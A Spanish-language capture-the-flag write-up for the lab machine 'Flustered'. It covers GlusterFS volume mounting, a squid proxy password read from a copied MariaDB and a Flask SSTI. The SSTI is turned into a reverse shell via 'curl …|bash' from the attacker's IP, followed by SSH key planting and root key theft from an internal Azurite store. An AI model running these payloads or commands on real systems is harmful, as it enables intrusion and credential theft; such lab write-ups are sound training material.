# Flustered

![](../../assets/img/Pasted_image_20260728125918.png)

- steam-era.htb

- 80
El nombre es *steampunk-era.htb* -> puede ser un dominio

![](../../assets/img/Pasted_image_20260728130351.png)

- Nos descargamos la imagen por si es un reto de estaganografía
*/static/steampunk-3006650_1280.webp*
- No vemos nada raro, nos pide un salvoconducto en cualquier caso

- 111
rpcbind -> nada a priori

- 3128
Squid http proxy 4.6

![](../../assets/img/Pasted_image_20260728130933.png)

- 24007
rpcbind -> nada a priori

- 49152
ssl unknown
Vemos certificados con
```bash
openssl s_client -connect 10.129.36.211:49152
```

**flustered.htb**

- Inspeccionamos https://flustered.htb:49152
Nos da un error de PR_CONNECT_RESET_ERROR

- Empezamos a fuzzear *flustered.htb*
```bash
wfuzz -c -t 200 --hc=404 --hh=173 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://flustered.htb/FUZZ/
```

Nada

- Subdominios
Hay muchas respuestas 502 con 173ch y 200 con 245ch -> las excluímos
```bash
wfuzz -c -t 200 --hc=404 --hh=173,245 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "host: FUZZ.flustered.htb" http://flustered.htb
```

- Fuzzeamos https://flustered.htb
Nada

- Buscamos vulenrabilidades de squid proxy 4.6
Damos con un CVE-2025-62168
https://github.com/nehkark/CVE-2025-62168

---> Averiguamos que podemos intentar lanzar una petición con curl que apunte a la propia máquina a traves del proxy squid
```bash
curl --proxy http://flustered.htb:3128 http://127.0.0.1
```

localhost porque usando el proxy es la propia máquina

![](../../assets/img/Pasted_image_20260729090835.png)

Nos devuelve contenido pero no tenemos acceso -> squid proxy requiere de estar autenticado con credenciales para acceder
- De momento no tenemos nada

- Vamos a intentar averiguar que corre en el puerto 24007 por ejemplo, ya que nmap no nos reporta nada
Buscamos en google "24007 port default"

![](../../assets/img/Pasted_image_20260729091238.png)

Vemos algo como **GlusterFS** (se parece al nombre de la máquina -> pista)
- Qué es GlusterFS

![](../../assets/img/Pasted_image_20260729091601.png)

- Vamos a buscar por herramientas que nos permitan conectarnos o usar GlusterFs
Primero buscaremos en los paquetes con *apt*
```bash
sudo apt update
apt search gluster
```

![](../../assets/img/Pasted_image_20260729092111.png)

Encontramos varios paquetes
- Nos instalaremos tanto el cliente como el servidor
```bash
sudo apt install glusterfs-client glusterfs-server
```

- Nuestra idea ahora es conectarnos al supuesto gestor de archivos para ver si podemos listar algo y comprobar si efectivamente es un glusterfs
```bash
man gluster
```

Estudiaremos como se usa la herramienta

![](../../assets/img/Pasted_image_20260729121159.png)

Vemos
--remote-host=
volume list

- Nos conectaremos al remote host de la máquina víctima para intentar enumerar volúmenes
```bash
gluster --remote-host=10.129.36.211 volume list
```

Vemos dos volúmenes

![](../../assets/img/Pasted_image_20260729121443.png)

**vol1** y **vol2**

- Montaremos los volúmenes con *mount* en nuestro equipo
Buscamos cómo montar los volúmenes en google "mount glusterfs"

![](../../assets/img/Pasted_image_20260729123357.png)

```bash
mount -t glusterfs 10.129.36.211:/vol1 /mnt/flustered
```

- Nos hemos creado un directorio /flustered en /mnt
Nos devuelve error

![](../../assets/img/Pasted_image_20260729123446.png)

Consultamos el log en */var/log/* vemos que hay una carpeta **/glusterfs** y un archivo *mnt-flustered.log*
- El error nos reporta Nombre DNS desconocido **flustered**

![](../../assets/img/Pasted_image_20260729123637.png)

Lo añadimos al /etc/hosts
- Nos da un error de certificado

![](../../assets/img/Pasted_image_20260729123812.png)

NO podemos hacer mucho con esto

- Vamos a probar a montar el *vol2*
```bash
mount -t glusterfs 10.129.36.211:/vol2 /mnt/flustered
```

Parece que NO da error
```bash
ls /mnt/flustered
```

![](../../assets/img/Pasted_image_20260729124016.png)

Vemos un montón de archivos que nos hacen recordar a lo que hay dentro de la carpeta *mysql* en cualquier máquina

![](../../assets/img/Pasted_image_20260729124840.png)

Si buscamos por strings dentro del binario **mysql_upgrade_info**, vemos la versión de la base de datos que corre en la montura y por tanto en la máquina víctima
```bash
strings mysql_upgrade_info
```

**10.3.31-MariaDB**

- Intentaremos desplegar un contenedor con esta versión de mysql para poder ejecutar lo que hay en la base de datos expuesta por glusterfs en la montura que hemos creado
Dentro del contenedor, meteremos los archivos en el mismo directorio que se encuentran los datos de TABLAS, COLUMNAS, etc de mysql en nuestra máquina **/var/lib/mysql/**

¿POR QUÉ UN DOCKER?
Nos sirve para ejecutar la misma versión de MariaDB (que no es la misma en nuestra máquina) y para no tocar archivos que tengamos de bases de datos en nuestra propia máquina

- Nos copiamos la montura a */tmp/mysql/*
```bash
cp -R /mnt/flustered/* .
```

Levantamos el docker con
```bash
docker run --name mariadb -v /tmp/mysql:/var/lib/mysql -d mariadb:10.3.31
```

-v: monta */tmp/mysql* de la máq original en */var/lib/mysql* del docker
-d: para el binario mariadb coge justo esa versión que queremos

![](../../assets/img/Pasted_image_20260729130139.png)

- Nos conectamos ahora al docker para trabajar con la base de datos que refleja la de la máquina víctima
```bash
docker exec -it mariadb bash
```

-i: interactive
-t: tty

![](../../assets/img/Pasted_image_20260729130948.png)

- Ejecutaremos mariadb desde el docker
```bash
docker exec -it mariadb mysql
```

![](../../assets/img/Pasted_image_20260729131327.png)

Nos da un error en un plugin que no tenemos *unix_socket*
- Lo buscamos en google para intentar instalarlo

![](../../assets/img/Pasted_image_20260729132025.png)

- Tendremos que crear un archivo *50-server.cnf* con una estructura de [mysqld] en nuestro caso será [mariadb] y debajo escribir la línea de carga del plugin
- Nos lo creamos en tmp de nuestra máquina
```bash
echo '' > /tmp/50-server.cnf
```

![](../../assets/img/Pasted_image_20260729132309.png)

- Ahora tendremos que meterlo según nos dice la pág en la ruta */etc/mysql/mariadb.conf.d*
Accedemos al docker a comprobar si existe

![](../../assets/img/Pasted_image_20260729132451.png)

Existe y no hay ningún archivo dentro -> perfecto

- Eliminaremos el docker y la imagen para volver a crear una imagen de docker con esta nueva configuración
```bash
docker stop mariadb
```

-> Para el contenedor
```bash
docker ps
docker ps -a
```

```bash
docker ps -a -q
```

-> Nos devuelve los IDs
```bash
docker rm $(docker ps -a -q)
```

-> Eliminamos los contenedores cuyos IDs nos devuelve la función
```bash
docker ps -a -q
```

```bash
docker images
```

-> Consultar imágenes
```bash
docker rmi $(docker images -q)
```

elimina imágenes que existan cuyos IDs los obtiene de
```bash
docker images -q
```

![](../../assets/img/Pasted_image_20260729132911.png)

- Creamos el nuevo contenedor
```bash
sudo docker run --name mariadb -v /tmp/mysql:/var/lib/mysql -v /tmp/50-server.cnf:/etc/mysql/mariadb.conf.d/50-server.cnf -d mariadb:10.3.31
```

Ahora el archivo */etc/mysql/mariadb.conf.d/50-server.cnf*  lo sacamos de nuestra máquina en */tmp/50-server.cnf*

- Nos lanzamos mysql
```bash
sudo docker exec -it mariadb mysql
```

![](../../assets/img/Pasted_image_20260729133915.png)

Conectados

- Vemos *squid -> passwd*

![](../../assets/img/Pasted_image_20260729134022.png)

lance.friedman:o>WJ5-jD<5^m3

- Nos servirá para conectarnos al proxy squid con curl
Ahora si hacemos una petición a un recurso que exista tendremos permiso
(Por ejemplo, en el css de carga del error muestra un recurso de imagen */squid-internal-static/icons/SN.png*)
```bash
curl -U --proxy http://flustered.htb:3128 http://127.0.0.1/squid-ernal-static/icons/SN.png --output test.png
```

Nos descarga el archivo y podremos verlo con
```bash
firefox test.png
```

- Si ahora intentamos listar el localhost nos devolverá un 200
```bash
curl --proxy 'http://lance.friedman:o>WJ5-jD<5^m3@flustered.htb:3128' http://127.0.0.1
```

Para usar proxy autenticado -> http://user:pass@domain:port http://resource

![](../../assets/img/Pasted_image_20260729183939.png)

Nos devuelve un "Welcome to nginx!"

- Es hora de fuzzear a través del proxy con GOBUSTER

![](../../assets/img/Pasted_image_20260729190152.png)

Nos dice que la url del proxy es incorrecta -> CODIFICAR en hexadecimal los caracteres raros
```bash
man ascii
```

![](../../assets/img/Pasted_image_20260729190235.png)

![](../../assets/img/Pasted_image_20260729190244.png)

o>WJ5-jD<5^m3 pasaría a ser -> **o%3EWJ5-jD%3C5%5Em3**
```bash
gobuster dir --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.129.36.211:3128' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://127.0.0.1
```

![](../../assets/img/Pasted_image_20260729190909.png)

- Vamos a enumerar dentro del directorio */app* -> suele tener dentro archivos *.py*
```bash
gobuster dir --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.129.36.211:3128' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://127.0.0.1/app/ -x py,html,php,js,txt
```

![](../../assets/img/Pasted_image_20260729191147.png)

- Nos traemos al archivo *app.py*
```bash
curl --proxy 'http://lance.friedman:o>WJ5-jD<5^m3@flustered.htb:3128' http://127.0.0.1/app/app.py -o app.py
```

![](../../assets/img/Pasted_image_20260729191338.png)

De primeras vemos que corre Flask -> esto ya huele a posible SSTI

- Analizando el código vemos que la función **getsiteurl()** usa como parámetro de entrada *config* y hace comprueba si *"siteurl"* como valor existe en ese parámetro *config*, en ese caso nos devolverá el propio parámetro *"siteurl"*
-
En el caso contrario, si no le pasamos ningún parámetro, devolverá *steampunk-era.htb* que es lo que veíamos en el html principal al inicio
```bash
curl -s -X GET "http://flustered.htb/" | cat -l html
```

![](../../assets/img/Pasted_image_20260729192500.png)

- Ahora intentaremos pasarle parámetro en JSON (tiene que ser por POST) el parámetro "siteurl"
- Tiene que ser por json porque en la función **index_page()** vemos que hay un

![](../../assets/img/Pasted_image_20260729192708.png)

- Enviamos la petición con curl
```bash
curl -s -X GET "http://flustered.htb/" -H "Content-type: application/json" -d '{"siteurl": "caca"}' | cat -l html
```

![](../../assets/img/Pasted_image_20260729192737.png)

Vemos que el parámetro que le pasamos *caca* se ve reflejado en la página
- **POSIBLE INYECCIÓN**

- Hemos dicho antes que corre un Flask y que olía a SSTI -> Intentaremos
```bash
curl -s -X GET "http://flustered.htb/" -H "Content-type: application/json" -d '{"siteurl": "{{4*7}}"}' | cat -l html
```

![](../../assets/img/Pasted_image_20260729192936.png)

- PREMIO, acontece el SSTI

- Usaremos el recurso PayLoadAllTheThings para obtener RCE y revshell
Da bastante problema el payload con las comillas

- Lanzamos la petición a burpsuite con
```bash
curl -s -X GET "http://flustered.htb/" -H "Content-type: application/json" -d '{"siteurl": "{{7*7}}"}' --proxy http://127.0.0.1:8080
```

Burp funciona como un proxy que escucha en nuestro equipo en el puerto 8080
*127.0.0.1:8080*

- Enviamos la petición al repeater

![](../../assets/img/Pasted_image_20260729194105.png)

Ya tenemos la petición en burp

- Usaremos el payload común
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Pero en lugar de usar popen, ejecutaremos la función system

![](../../assets/img/Pasted_image_20260729195820.png)

```bash
{{ self.__init__.__globals__.__builtins__.__import__(\"os\").system(\"ping -c 4 10.10.16.179\") }}
```

- *También funciona con el popen('x').read()*

![](../../assets/img/Pasted_image_20260729195931.png)

- Intentamos el RCE de nuevo pero no queremos usar el proxy, queremos hacerlo desde la consola para que la respuesta no se pierda por el camino
- Escaparemos las ' cambiandolas por comillas dobles escapadas con una sola barra *\\"*

![](../../assets/img/Pasted_image_20260729195342.png)

Acontece el RCE

- Lanzamos revshell con
```bash
curl -s -X GET "http://flustered.htb/" -H "Content-type: application/json" -d '{"siteurl": "{{ self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"curl http://10.10.16.179|bash\").read() }}"}'
```

www-data

## Escalada

- USUARIOS -> *jennifer*
- SUDO
- SUID
- CAPS
- PUERTOS -> Vemos un 3306 abierto probablemente mysql

- linpeas.sh
Parece que hay un subdominio www.steampunk-era.htb

![](../../assets/img/Pasted_image_20260729203023.png)

etc/mysql/mariadb.cnf
/etc/ssl/glusterfs.key

- Vemos que hay una carpeta *gluster* con */gluster/bricks/brick1/vol1* y */gluster/bricks/brick1/vol2* sobre los que no tenemos permiso, pero sí **jennifer** -> Posible escalada a root

- Encontramos una RSA PRIVATE KEY en */etc/ssl/glusterfs.key*
Nos lo guardamos en nuestra máquina e intentamos usarlo para conectarnos por ssh a algún usuario -> Nada

- Acabo de acordarme de que para instalar el vol1 por glusterfs nos daba un error por no existir un certificado ssl
- Nos pasamos el */etc/ssl/glusterfs.key* y lo metemos en el */etc/ssl* de nuestro equipo, le dejaremos el mismo nombre en principio
- Nos sigue dando error, por lo que nos pasaremos los tres certificados (nos lo indica en el propio log de */var/log/glusterfs/mnt-flustered.log*)
Son **glusterfs.ca glusterfs.key glusterfs.pem**

- Montamos el vol1
```bash
sudo mount -t glusterfs 10.129.36.211:/vol1 /mnt/flustered
```

![](../../assets/img/Pasted_image_20260729210241.png)

Parece que lo hace okey con todos los certificados

![](../../assets/img/Pasted_image_20260729210428.png)

Parece que la montura es el */home/usuario* de alguien, probablemente jennifer

- Crearemos un par de claves con nuestro usuario *root* y meteremos la pública en **authorized_keys** dentro del *.ssh* de la montura
```bash
sudo su
ssh-keygen -t rsa
cd /root/.ssh
cat id_rsa.pub | tr -d '\n' | xclip -sel clip
```

tr -d: quita el salto final de línea
xclip -sel clip: copia el contenido a la clipboard *Ctrl+shift+v*

- Las añadimos a */mnt/flustered/.ssh/authorized_keys*
```bash
echo 'clave_publica' > /mnt/flustered/.ssh/authorized_keys
ssh jennifer@10.129.36.211
```

jennifer

- Viendo la ip de la máquina vemos que existe lo que parece un contenedor
```bash
hostname -I
```

![](../../assets/img/Pasted_image_20260729221735.png)

- Vamos a crear un **hostDiscovery.sh** para escanear hosts dentro de la subred *172.0.0.0/24* ya que no tenemos permisos como jennifer para ejecutar un
```bash
docker ps
```

o
```bash
docker images
```

![](../../assets/img/Pasted_image_20260729222920.png)

- *seq 1 254* -> 254 es el máximo valor que puede adquirir la IP
- *&* y *wait* son para ejecutar con hilos de forma simultánea
- *timeout 1* para esperar solo 1 segundo la respuesta
```bash
./hostDiscovery.sh
chmod +x hostDiscovery.sh
```

![](../../assets/img/Pasted_image_20260729222903.png)

- Haremos de forma parecida ahora un **portDiscovery.sh** para descubrir puertos abiertos en alguna de estos hosts que hemos descubierto

![](../../assets/img/Pasted_image_20260729223812.png)

![](../../assets/img/Pasted_image_20260729223756.png)

Nos reporte el puerto 10000 abierto

- Vamos a inspeccionar que es ese puerto
Probamos primeramente si es http
```bash
curl http://172.17.0.2:10000
```

![](../../assets/img/Pasted_image_20260729224058.png)

- Tiene toda la pinta

- Haremos un port forwarding del tráfico que corre en el puerto 10000 por ssh hacia nuestra máquina
```bash
ssh jennifer@10.129.36.211 -L 10000:172.17.0.2:10000
```

Comprobamos que se ha levantado el túnel con
```bash
lsof -i:10000
```

-> Tenemos que ser root

![](../../assets/img/Pasted_image_20260729224718.png)

Vemos que es un webmin
Desde nuestro navegador podemos ver el contenido

![](../../assets/img/Pasted_image_20260729224907.png)

- Corremos un nmap al puerto 10000 de nuestr máquina para ver qué es
```bash
nmap -sCV -p10000 127.0.0.1
```

![](../../assets/img/Pasted_image_20260729225255.png)

Azurite-Blob/3.14.3
- Qué es

![](../../assets/img/Pasted_image_20260729225359.png)

- Buscamos información de cómo conectanos a este azurite blob storage

![](../../assets/img/Pasted_image_20260729231010.png)

- Nos habla de un Azure Storage Explorer

- Buscamos como instalarlo

![](../../assets/img/Pasted_image_20260729231422.png)

```bash
sudo apt install snapd
sudo snap install storage-explorer
```

- Nos da un error
```bash
systemctl status snapd
```

-> Vemos que está *disabled*
```bash
sudo systemctl start snapd
sudo systemctl enable snapd
```

De nuevo
```bash
sudo snap install storage-explorer
```

- Lo corrermos
```bash
storage-explorer
```

Iremos a **Conexión a los recursos de Azure** -> **Emulador de almacenamiento local**

![](../../assets/img/Pasted_image_20260729233644.png)

Nos pide varios parámetros que iremos probando para conectarnos
- Nombre -> Flustered por ejemplo
- Nombre de la cuenta -> jennifer porque es la que está involucrada
- Clave de la cuenta -> Vamos a buscarla en la máquina víctima
```bash
/var/backups/key
```

![](../../assets/img/Pasted_image_20260729233751.png)

Hacemos
```bash
cat /var/backups/key
```

FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==
- Vemos que es una key que puede valer ya que nos dice que tiene que ser en base64

- Nos conectamos y vemos dos archivos

![](../../assets/img/Pasted_image_20260729235842.png)

Nos descargamos lo que parece la id_rsa de root -> la guardamos en nuestra máquina

- Nos conectamos por ssh
```bash
ssh root@10.129.36.211 -i id_rsa
```

root
